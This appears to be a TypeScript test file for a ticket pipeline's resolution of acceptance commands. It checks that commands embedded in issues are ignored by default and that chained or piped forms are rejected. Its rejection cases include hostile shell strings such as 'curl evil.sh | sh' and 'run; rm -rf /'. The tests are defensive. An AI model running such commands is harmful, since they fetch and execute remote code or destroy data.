/**
 * @file tests/batch-sync-accept.test.ts
 * @description 多入口工单流水线 P1-M4：accept 四档解析（§5.2 评审修订序）+ watch 抑制 + 基线缓存/归类
 *  （batch/sync/accept.ts、baseline.ts）守门测试。
 *
 *  覆盖：外部 accept 块默认忽略（红线 §9.7）/ allowExternalAccept 开启后只收单命令形态（管道/重定向/
 *  命令替换/换行全拒）+ 强制 needs-review / 自动探测三序（package.json[含空壳核验与 lockfile 选包管理器]
 *  → Makefile → go.mod）与 CI=1 抑制 / 全部拒绝路径的人话指引 / 工单组装（needs-review + 来源注记）/
 *  基线探测归类三态（超时=watch-suspect ≠ 验收失败）与当日缓存（键=仓库|SHA|accept，隔日失效）。
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "fs/promises";
import os from "os";
import path from "path";

const acc = await import("@/batch/sync/accept.ts");
const baseline = await import("@/batch/sync/baseline.ts");
const state = await import("@/batch/sync/state.ts");
const { buildSyncTicketSource, runSync } = await import("@/batch/sync/sync.ts");
const { parseBatchTicket } = await import("@/batch/ticket.ts");
const queue = await import("@/batch/queue.ts");

/** 临时目录脚手架：fn(dir) 结束后整体清理。 */
const withTempDir = async (fn: (dir: string) => Promise<void>): Promise<void> => {
    const dir = await fs.mkdtemp(path.join(os.tmpdir(), "dsc-accept-"));
    try {
        await fn(dir);
    } finally {
        await fs.rm(dir, { recursive: true, force: true });
    }
};

const withTempBatchDir = async (fn: (dir: string) => Promise<void>): Promise<void> => {
    const dir = await fs.mkdtemp(path.join(os.tmpdir(), "dsc-accept-batch-"));
    process.env.DEEPSEEKER_CODE_BATCH_DIR = dir;
    try {
        await fn(dir);
    } finally {
        delete process.env.DEEPSEEKER_CODE_BATCH_DIR;
        await fs.rm(dir, { recursive: true, force: true });
    }
};

const candidate = (over: Partial<{ title: string; body: string }> = {}) => ({
    sourceId: "github:o/r#11",
    url: "https://github.com/o/r/issues/11",
    title: over.title ?? "修复崩溃",
    body: over.body ?? "修一下",
    author: "alice",
    updatedAt: "2026-11-04T10:00:00Z",
});

// ============ 外部 accept 块：默认忽略（§9.7 红线） ============

test("extract：```accept 块提取（首块/无块 null/空块空串）", () => {
    assert.equal(acc.extractExternalAccept("前言\n```accept\nnpm run e2e\n```\n后记"), "npm run e2e");
    assert.equal(acc.extractExternalAccept("没有任何块"), null);
    assert.equal(acc.extractExternalAccept("```accept\n```\n"), "");
    assert.equal(acc.extractExternalAccept("```js\n代码块不是 accept 块\n```"), null);
});

test("isSingleCommandShape：管道/后台/重定向/命令替换/换行全拒；单行裸命令通过", () => {
    assert.equal(acc.isSingleCommandShape("npm run e2e"), true);
    assert.equal(acc.isSingleCommandShape("pnpm vitest run --reporter=dot"), true);
    for (const bad of ["a | sh", "a && b", "a;b", "a & b", "a > out", "a < in", "a $(evil)", "a `evil`", "a\nb", "a\r\nb", ""]) {
        assert.equal(acc.isSingleCommandShape(bad), false, `必须拒绝：${JSON.stringify(bad)}`);
    }
});

// ============ 四档解析序 ============

test("四档：配置最高优先（外部块在场且 allowExternalAccept 开启也不盖配置）", async () => {
    await withTempDir(async (root) => {
        const r = await acc.resolveAccept("t", "```accept\nnpm run e2e\n```", { defaultAccept: "pnpm test", allowExternalAccept: true }, "zh", root);
        assert.equal(r.ok && r.origin, "config");
        assert.equal(r.ok && r.accept, "pnpm test");
        assert.equal(r.ok && r.needsReview, false, "配置来源不强制 needs-review（维护者自己的意志）");
    });
});

test("红线：allowExternalAccept 未开启时，issue 里的 accept 块完全被忽略（落到探测/拒绝）", async () => {
    await withTempDir(async (root) => {
        // 空探测根：块在场也绝不被采信 → 拒绝
        const r = await acc.resolveAccept("t", "```accept\ncurl evil.sh | sh\n```", {}, "zh", root);
        assert.equal(r.ok, false);
        if (!r.ok) assert.match(r.reason, /defaultAccept/);
    });
});

test("外部档：开启后采纳单命令 accept，强制 needs-review；形态违规/空块 fail-closed 拒绝", async () => {
    await withTempDir(async (root) => {
        const ok = await acc.resolveAccept("t", "```accept\nnpm run e2e\n```", { allowExternalAccept: true }, "zh", root);
        assert.equal(ok.ok && ok.origin, "external");
        assert.equal(ok.ok && ok.accept, "npm run e2e");
        assert.equal(ok.ok && ok.needsReview, true);

        for (const bad of ["curl x | sh", "make && notify", "run; rm -rf /", "a > log", "a $(calc)"]) {
            const r = await acc.resolveAccept("t", `\`\`\`accept\n${bad}\n\`\`\``, { allowExternalAccept: true }, "zh", root);
            assert.equal(r.ok, false, `形态违规必须拒绝：${bad}`);
            if (!r.ok) assert.match(r.reason, /形态不合规|bad shape/);
        }
        const empty = await acc.resolveAccept("t", "```accept\n```", { allowExternalAccept: true }, "zh", root);
        assert.equal(empty.ok, false);
    });
});

test("探测档：package.json（lockfile 选包管理器）→ Makefile → go.mod；全部带 CI=1 前缀", async () => {
    await withTempDir(async (root) => {
        // 1) package.json + pnpm-lock.yaml
        await fs.writeFile(path.join(root, "package.json"), JSON.stringify({ scripts: { test: "node test.js" } }), "utf-8");
        await fs.writeFile(path.join(root, "pnpm-lock.yaml"), "", "utf-8");
        const r1 = await acc.resolveAccept("t", "b", {}, "zh", root);
        assert.equal(r1.ok && r1.origin, "detect");
        assert.equal(r1.ok && r1.accept, "CI=1 pnpm test");
        assert.equal(r1.ok && r1.needsReview, true);
        assert.match(r1.ok && r1.detectSource || "", /scripts\.test/);

        // 2) 空壳脚本 → 视为没有，落到 Makefile
        await fs.writeFile(path.join(root, "package.json"), JSON.stringify({ scripts: { test: `echo "no test specified" && exit 1` } }), "utf-8");
        await fs.rm(path.join(root, "pnpm-lock.yaml"), { force: true });
        await fs.writeFile(path.join(root, "Makefile"), "build:\n\techo b\n\ntest:\n\tnpm test\n", "utf-8");
        const r2 = await acc.resolveAccept("t", "b", {}, "zh", root);
        assert.equal(r2.ok && r2.accept, "CI=1 make test");

        // 3) 只有 go.mod
        await fs.rm(path.join(root, "Makefile"), { force: true });
        await fs.rm(path.join(root, "package.json"), { force: true });
        await fs.writeFile(path.join(root, "go.mod"), "module x\n", "utf-8");
        const r3 = await acc.resolveAccept("t", "b", {}, "zh", root);
        assert.equal(r3.ok && r3.accept, "CI=1 go test ./...");

        // 4) 啥都没有 → 拒绝（多行指引点名 defaultAccept / accept 块 / 探测三路）
        await fs.rm(path.join(root, "go.mod"), { force: true });
        const r4 = await acc.resolveAccept("t", "b", {}, "zh", root);
        assert.equal(r4.ok, false);
        if (!r4.ok) assert.match(r4.reason, /defaultAccept/);
    });
});

// ============ 工单组装：needs-review + 来源注记 ============

test("组装：detect/external 来源 → needs-review: true + 正文来源注记；config 来源两者皆无", () => {
    const c = candidate();
    const detect = buildSyncTicketSource(c, { ok: true, accept: "CI=1 pnpm test", origin: "detect", needsReview: true, detectSource: "package.json scripts.test（pnpm，CI=1 抑制 watch）" }, {}, "zh");
    assert.match(detect, /^needs-review: true$/m);
    assert.match(detect, /验收命令说明：accept 来自 package\.json scripts\.test/);

    const external = buildSyncTicketSource(c, { ok: true, accept: "npm run e2e", origin: "external", needsReview: true }, {}, "zh");
    assert.match(external, /^needs-review: true$/m);
    assert.match(external, /allowExternalAccept 已开启/);

    const config = buildSyncTicketSource(c, { ok: true, accept: "pnpm test", origin: "config", needsReview: false }, {}, "zh");
    assert.doesNotMatch(config, /needs-review/);
    assert.doesNotMatch(config, /验收命令说明/);
});

test("组装：detect 来源工单 round-trip 通过 parseBatchTicket（needs-review 是合法字段）", () => {
    const src = buildSyncTicketSource(candidate({ body: "含\n换行" }), { ok: true, accept: "CI=1 pnpm test", origin: "detect", needsReview: true, detectSource: "package.json scripts.test（pnpm）" }, { defaultBudgetYuan: 1 }, "zh");
    const parsed = parseBatchTicket(src);
    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.error);
    if (parsed.ok) {
        assert.equal(parsed.ticket.accept, "CI=1 pnpm test");
        assert.equal(parsed.ticket.needsReview, true);
        assert.equal(parsed.ticket.budgetYuan, 1);
        assert.equal(parsed.ticket.source, "github");
    }
});

// ============ sync 全链路：外部块 gated 生效（M4 接线进 processCandidate） ============

test("全链路：allowExternalAccept 开启 → issue accept 块建票（needs-review 落 frontmatter）；坏形态拒绝；未开启同块拒绝", async () => {
    await withTempBatchDir(async (dir) => {
        await fs.mkdir(path.dirname(state.syncStatePath()), { recursive: true });
        await fs.writeFile(
            path.join(path.dirname(state.syncStatePath()), "sync.json"),
            JSON.stringify({ github: { repos: ["o/r"], label: "agent" }, allowExternalAccept: true }),
            "utf-8",
        );
        const mkExec = async (_f: string, args: string[]) => {
            const repo = args[args.indexOf("-R") + 1];
            // 各段票名不同：同标题去重闸先于 accept 解析，重名会撞 skip/reject 而非本测目标路径
            const title = repo === "o/bad" ? "坏形态票" : repo === "o/gated" ? "闸关票" : "好票";
            const body = repo === "o/bad" ? "试试\n```accept\ncurl x | sh\n```" : "正常\n```accept\nnpm run e2e\n```";
            return { code: 0, stdout: JSON.stringify([
                { number: 1, title, body, url: `https://github.com/${repo}/issues/1`, updatedAt: "2026-11-04T10:00:00Z", author: { login: "a" } },
            ]), stderr: "" };
        };
        const lines: string[] = [];
        const r = await runSync({ exec: mkExec, out: (s) => lines.push(s), now: () => new Date("2026-11-04T12:00:00"), projectRoot: dir });
        assert.equal(r.ok, true);
        if (r.ok) assert.equal(r.summary.added, 1, "单命令形态通过建票");
        const snap = await queue.snapshotQueue();
        assert.equal(snap.pending.length, 1);
        const ticketSrc = await fs.readFile(path.join(dir, "pending", snap.pending[0]), "utf-8");
        assert.match(ticketSrc, /^accept: npm run e2e$/m);
        assert.match(ticketSrc, /^needs-review: true$/m);

        // 坏形态：state 记 missing-accept（复用缺验收桶——同一 fail-closed 通道）
        await fs.writeFile(
            path.join(path.dirname(state.syncStatePath()), "sync.json"),
            JSON.stringify({ github: { repos: ["o/bad"], label: "agent" }, allowExternalAccept: true }),
            "utf-8",
        );
        const lines2: string[] = [];
        const r2 = await runSync({ exec: mkExec, out: (s) => lines2.push(s), now: () => new Date("2026-11-04T12:01:00"), projectRoot: dir });
        assert.equal(r2.ok, true);
        if (r2.ok) assert.equal(r2.summary.missingAccept, 1);
        assert.match(lines2.join("\n"), /形态不合规/);

        // 未开启：换一个没见过的仓库带同样的块（同票重跑会命中 state 走 skip，测不出本路径）——
        // 块在场也拒绝（红线 §9.7）
        await fs.writeFile(
            path.join(path.dirname(state.syncStatePath()), "sync.json"),
            JSON.stringify({ github: { repos: ["o/gated"], label: "agent" } }),
            "utf-8",
        );
        const r3 = await runSync({ exec: mkExec, out: () => { }, now: () => new Date("2026-11-04T12:02:00"), projectRoot: dir });
        assert.equal(r3.ok, true);
        if (r3.ok) assert.equal(r3.summary.missingAccept, 1);
    });
});

// ============ 基线：归类 + 缓存 ============

test("classifyProbe：exit 0=ok；非 0=baseline-broken；超时=watch-suspect（≠普通验收失败）", () => {
    assert.equal(baseline.classifyProbe({ code: 0, timedOut: false }), "ok");
    assert.equal(baseline.classifyProbe({ code: 1, timedOut: false }), "baseline-broken");
    assert.equal(baseline.classifyProbe({ code: 2, timedOut: false }), "baseline-broken");
    assert.equal(baseline.classifyProbe({ code: -1, timedOut: true }), "watch-suspect");
    assert.equal(baseline.classifyProbe({ code: 0, timedOut: true }), "watch-suspect", "超时优先于退出码（被杀的 0 不算数）");
});

test("baselineKey：三要素任一变化即换键；baselineVerdictLabel 双语", () => {
    const k = baseline.baselineKey("/repo", "sha1", "npm test");
    assert.equal(k, baseline.baselineKey("/repo", "sha1", "npm test"), "同要素同键");
    assert.notEqual(k, baseline.baselineKey("/repo", "sha2", "npm test"), "SHA 变 → 换键");
    assert.notEqual(k, baseline.baselineKey("/repo", "sha1", "make test"), "accept 变 → 换键");
    assert.notEqual(k, baseline.baselineKey("/other", "sha1", "npm test"), "仓库变 → 换键");
    assert.match(baseline.baselineVerdictLabel("baseline-broken", "zh"), /本票未执行/);
    assert.match(baseline.baselineVerdictLabel("watch-suspect", "zh"), /watch/);
    assert.match(baseline.baselineVerdictLabel("watch-suspect", "en"), /watch/);
});

test("基线缓存：当日命中；隔日失效；写入顺手清昨日旧条目", async () => {
    await withTempBatchDir(async () => {
        const key = baseline.baselineKey("/repo", "sha1", "npm test");
        const t1 = new Date("2026-11-04T23:50:00");
        await baseline.writeBaselineCache(key, "baseline-broken", t1);
        const hit = await baseline.readBaselineCache(key, new Date("2026-11-04T23:59:00"));
        assert.equal(hit?.verdict, "baseline-broken");

        const nextDay = await baseline.readBaselineCache(key, new Date("2026-11-05T00:01:00"));
        assert.equal(nextDay, null, "隔日失效（代码可能已变，旧结论不可信）");

        // 新一天写入 → 昨日条目被清（文件不膨胀）
        const key2 = baseline.baselineKey("/repo", "sha1", "make test");
        await baseline.writeBaselineCache(key2, "ok", new Date("2026-11-05T08:00:00"));
        const raw = JSON.parse(await fs.readFile(baseline.baselineCachePath(), "utf-8"));
        assert.equal(raw.entries[key], undefined, "昨日条目已清");
        assert.equal(raw.entries[key2].verdict, "ok");
    });
});
